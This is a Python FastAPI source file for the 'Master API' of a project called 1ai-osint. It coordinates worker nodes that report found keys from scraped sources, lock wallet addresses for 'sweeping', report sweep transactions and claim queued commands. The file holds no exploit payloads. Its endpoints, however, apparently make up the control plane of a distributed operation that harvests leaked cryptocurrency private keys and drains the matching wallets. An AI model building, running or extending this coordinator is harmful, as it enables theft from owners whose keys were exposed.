"""Master API — FastAPI app for master-node coordination."""

from __future__ import annotations

import logging
import os
import secrets
from collections.abc import AsyncIterator
from contextlib import asynccontextmanager
from typing import Any

from dotenv import load_dotenv
from fastapi import Depends, FastAPI, Header, HTTPException
from pydantic import BaseModel

from src.modules.node import db

load_dotenv()

logger = logging.getLogger(__name__)

#: Optional shared secret protecting every endpoint except ``/api/health``.
#: Read from the environment at request time so runtime/test changes are
#: honored. Unset → all endpoints stay open (backward compatible); set →
#: callers must present ``Authorization: Bearer <token>`` or
#: ``X-Master-Token: <token>``.
_MASTER_API_TOKEN_ENV = "MASTER_API_TOKEN"

if os.environ.get(_MASTER_API_TOKEN_ENV) is None:
    logger.warning(
        "MASTER_API_TOKEN is not set — the master coordination API is wide open. "
        "Set it before exposing the API on a non-loopback interface (0.0.0.0)."
    )


# ── Request models ──────────────────────────────────────────────────────────


class KeysRequest(BaseModel):
    node_id: str
    keys: list[dict[str, str]]  # [{key_hash, key_type, source}]


class HeartbeatRequest(BaseModel):
    node_id: str
    status: dict[str, Any]


class LockRequest(BaseModel):
    address: str
    node_id: str
    ttl_seconds: int = 300


class SweepRequest(BaseModel):
    address: str
    node_id: str
    sweep_tx: str


class ConfigRequest(BaseModel):
    node_id: str
    sources: list[str]


class CommandRequest(BaseModel):
    node_id: str
    command: str
    payload: dict = {}


# ── App ─────────────────────────────────────────────────────────────────────


@asynccontextmanager
async def lifespan(app: FastAPI) -> AsyncIterator[None]:
    """Startup/shutdown."""
    await db.init_db()
    logger.info("Master API started")
    yield
    await db.close_pool()
    logger.info("Master API stopped")


app = FastAPI(title="1ai-osint Master API", version="0.1.0", lifespan=lifespan)


def require_master_token(
    authorization: str | None = Header(default=None),
    x_master_token: str | None = Header(default=None),
) -> None:
    """Reject requests without a valid master token when one is configured.

    When ``MASTER_API_TOKEN`` is unset the API stays open (backward
    compatible). When set, every request must present either
    ``Authorization: Bearer <token>`` or ``X-Master-Token: <token>``.
    Constant-time comparison avoids token timing side channels.
    """
    expected = os.environ.get(_MASTER_API_TOKEN_ENV)
    if expected is None:
        return
    provided = ""
    if authorization and authorization.lower().startswith("bearer "):
        provided = authorization[7:].strip()
    elif x_master_token:
        provided = x_master_token.strip()
    if not provided or not secrets.compare_digest(provided, expected):
        raise HTTPException(status_code=401, detail="Invalid or missing master token")


# ── Endpoints ───────────────────────────────────────────────────────────────


@app.get("/api/health")
async def health() -> dict[str, Any]:
    """Health check."""
    return {"status": "ok", "service": "1ai-osint-master"}


@app.post("/api/keys")
async def report_keys(req: KeysRequest, _dep: None = Depends(require_master_token)) -> dict[str, Any]:
    """Node reports found keys."""
    recorded = 0
    for key in req.keys:
        key_hash = key.get("key_hash", "")
        key_type = key.get("key_type", "")
        source = key.get("source", "")
        if not key_hash:
            continue
        if not await db.is_key_seen(key_hash):
            await db.mark_key_seen(key_hash, key_type, source, req.node_id)
            recorded += 1
    return {"status": "ok", "recorded": recorded, "total": len(req.keys)}


@app.get("/api/seen")
async def get_seen(_dep: None = Depends(require_master_token)) -> dict[str, Any]:
    """Node downloads seen keys as Bloom filter."""
    bloom = await db.get_seen_keys_bloom()
    return {
        "status": "ok",
        "bloom": bloom.decode(),
        "count": bloom.count(b"|") + 1 if bloom else 0,
    }


@app.post("/api/locks")
async def acquire_lock(req: LockRequest, _dep: None = Depends(require_master_token)) -> dict[str, Any]:
    """Node acquires sweep lock."""
    acquired = await db.acquire_sweep_lock(req.address, req.node_id, req.ttl_seconds)
    if not acquired:
        raise HTTPException(status_code=409, detail="Lock already held")
    return {"status": "ok", "address": req.address, "node_id": req.node_id}


@app.delete("/api/locks/{address}")
async def release_lock(address: str, node_id: str, _dep: None = Depends(require_master_token)) -> dict[str, Any]:
    """Node releases sweep lock."""
    await db.release_sweep_lock(address, node_id)
    return {"status": "ok"}


@app.post("/api/heartbeat")
async def heartbeat(req: HeartbeatRequest, _dep: None = Depends(require_master_token)) -> dict[str, Any]:
    """Node reports status. Returns actual node_id (may differ if duplicate)."""
    actual_id = await db.record_heartbeat(req.node_id, req.status)
    return {"status": "ok", "node_id": actual_id}


@app.get("/api/sources")
async def get_sources(node_id: str, _dep: None = Depends(require_master_token)) -> dict[str, Any]:
    """Node fetches assigned sources."""
    sources = await db.get_assigned_sources(node_id)
    if not sources:
        # Auto-assign all sources if not assigned yet
        try:
            from src.modules.sources import ALL_SOURCES

            await db.assign_sources(node_id, list(ALL_SOURCES))
            sources = list(ALL_SOURCES)
        except Exception:
            # Fallback: return empty list if source discovery fails
            sources = []
    return {"status": "ok", "node_id": node_id, "sources": sources}


@app.post("/api/sources")
async def set_sources(req: ConfigRequest, _dep: None = Depends(require_master_token)) -> dict[str, Any]:
    """Master assigns sources to a node."""
    await db.assign_sources(req.node_id, req.sources)
    return {"status": "ok", "node_id": req.node_id, "sources": req.sources}


@app.post("/api/sweep")
async def report_sweep(req: SweepRequest, _dep: None = Depends(require_master_token)) -> dict[str, Any]:
    """Node reports sweep result."""
    await db.mark_swept(req.address, req.sweep_tx)
    return {"status": "ok", "address": req.address}


@app.get("/api/stats")
async def get_stats(_dep: None = Depends(require_master_token)) -> dict[str, Any]:
    """Aggregate stats."""
    stats = await db.get_stats()
    return {"status": "ok", **stats}


@app.get("/api/audit")
async def get_audit(limit: int = 100, _dep: None = Depends(require_master_token)) -> dict[str, Any]:
    """Full audit trail."""
    trail = await db.get_audit_trail(limit)
    return {"status": "ok", "events": trail}


@app.get("/api/nodes")
async def get_nodes(_dep: None = Depends(require_master_token)) -> dict[str, Any]:
    """List all nodes and their status."""
    heartbeats = await db.get_all_heartbeats()
    return {"status": "ok", "nodes": heartbeats}


@app.post("/api/commands")
async def enqueue_command(req: CommandRequest, _dep: None = Depends(require_master_token)) -> dict[str, Any]:
    """Enqueue a command for a node."""
    await db.enqueue_command(req.node_id, req.command, req.payload)
    return {"status": "ok", "node_id": req.node_id, "command": req.command}


@app.get("/api/commands/{node_id}")
async def claim_commands(node_id: str, _dep: None = Depends(require_master_token)) -> dict[str, Any]:
    """Claim pending commands for a node."""
    commands = await db.claim_commands(node_id)
    return {"status": "ok", "commands": commands}
